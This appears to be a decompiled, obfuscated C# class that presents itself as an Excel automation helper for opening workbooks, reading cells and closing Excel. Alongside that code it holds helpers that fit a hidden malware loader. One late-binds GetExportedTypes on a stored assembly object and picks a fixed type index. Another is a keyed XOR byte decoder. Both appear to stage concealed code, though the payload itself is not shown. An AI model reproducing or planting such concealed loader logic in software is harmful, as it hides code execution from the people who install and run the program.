using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Bn2g;
using Microsoft.VisualBasic.CompilerServices;
using Mp73;
using a2MW;
using c2J7;
using q2SA;

namespace Ln4;

public class Xt4
{
	private Jg05 _oXls;

	private w0CT _oWBook;

	private a6DJ _oSheet;

	public Jg05 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public w0CT OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public a6DJ OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Xt4()
	{
		_oXls = (Jg05)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Jw7(string Ya4, bool Zt1)
	{
		OWBook = OXls.Workbooks.Open(Ya4, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Zt1;
	}

	internal static bool Em6()
	{
		try
		{
			try
			{
				Type type = (Type)j3A(RuntimeHelpers.GetObjectValue(Ds5j.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Ds5j.mDic[Ds5j.tName].ToString(), false) == 0)
				{
					Ds5j.mDic.Add(Ds5j.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void n3P(string Ck7)
	{
		OSheet = (a6DJ)OWBook.Sheets[Ck7];
	}

	public w7M2 x6D(int z6D, int j6W)
	{
		return (w7M2)OSheet.Cells[z6D, j6W];
	}

	public void r7K(bool g7Q)
	{
		if (OWBook != null)
		{
			OWBook.Close(g7Q, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Jg05 c2P = OXls;
		p5Y(ref c2P);
		OXls = c2P;
	}

	internal static byte Ke6(byte Za9, byte[] y4W, int y4R, int Xs4)
	{
		Za9 = (byte)(Za9 ^ checked((byte)(y4W[unchecked(Xs4 % y4W.Length)] ^ ((Xs4 + unchecked(y4R % y4W.Length)) & y4R))));
		return Za9;
	}

	private static void p5Y<r2E>(ref r2E c2P, bool o6S = false) where r2E : class
	{
		if (c2P == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(c2P))
			{
				if (o6S)
				{
					Marshal.FinalReleaseComObject(c2P);
				}
				else
				{
					Marshal.ReleaseComObject(c2P);
				}
			}
		}
		finally
		{
			c2P = null;
		}
	}

	internal static object j3A(object Rw8)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Rw8, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
